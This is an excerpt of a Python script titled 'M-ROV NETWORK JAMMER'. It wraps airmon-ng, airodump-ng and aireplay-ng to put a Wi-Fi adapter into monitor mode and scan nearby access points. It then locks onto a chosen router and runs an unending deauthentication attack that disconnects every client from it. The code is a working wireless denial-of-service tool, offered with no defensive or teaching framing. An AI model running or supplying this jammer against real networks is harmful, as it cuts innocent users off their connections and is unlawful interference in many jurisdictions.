...
# version no displayed in title
version = "1.0"
# name displayed in title
name = "M-ROV NETWORK JAMMER"

# Wifi configurations
interface_name = "wlan0"
interface_in_monitor_mode = "wlan0mon"
# csv file in which output of airodump-ng command is stored
AP_file_name = "AP_file"

# Appearance
# width of each cell in table
cell_width = 20
...
def start_adapter(interface_name):
    ...
    airmon = subprocess.Popen(["airmon-ng", "start", interface_name],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = airmon.communicate()

    logger.info("Started airmon-ng check kill")
    check_kill = subprocess.Popen(
        ["airmon-ng", "check", "kill"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def stop_adapter(interface_in_monitor_mode):
    ...
    stop_mon = subprocess.Popen(
        ["airmon-ng", "stop", interface_in_monitor_mode], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ...
    stop_mon1 = subprocess.Popen(
        ["ifconfig", "interface_name", "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ...
    stop_mon2 = subprocess.Popen(
        ["service", "network-manager", "restart"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def start_jam(interface_in_monitor_mode):
    ...
    command = "xterm -geometry -500+100 -T \"please wait for 5 second\" -e \"timeout 5 airodump-ng -w AP_file --output-format csv --write-interval 1   " + \
    ...
    # print(fields[13])
    print('-'*table_width)
    print('|%s|%s|%s|' % (fields[13].center(cell_width), fields[3].center(
        cell_width), fields[0].center(cell_width)))
    print('-'*table_width)
    ...
    try:
        for row in rows:
            if(len(row) > 0 and row[0] != 'Station MAC'):
                ...
                print('|%s|%s|%s|' % (essid.center(cell_width),
                                      channel.center(cell_width), bssid.center(cell_width)))
                print('-'*table_width)
    ...
    if router_found == 0:
        ...
        command = "xterm -geometry -500+100 -T 'locking channel " + \
            desired_router[1] + "' -e ' timeout 5 airodump-ng --bssid " + desired_router[2] + \
            " -c " + desired_router[1] + " " + interface_in_monitor_mode + " '"
        os.system(command)
        print("\ntarget locked successfullly")

        print("deauthenticating all clients from the AP (press ctrl + C to exit)")
        command = "xterm -geometry -500+100 -T 'deauthenticating all users from " + \
            desired_router[0] + " (press ctrl+c to stop)' -e 'aireplay-ng --deauth 0 -a " + \
            desired_router[2] + " " + interface_in_monitor_mode + " '"
        os.system(command)
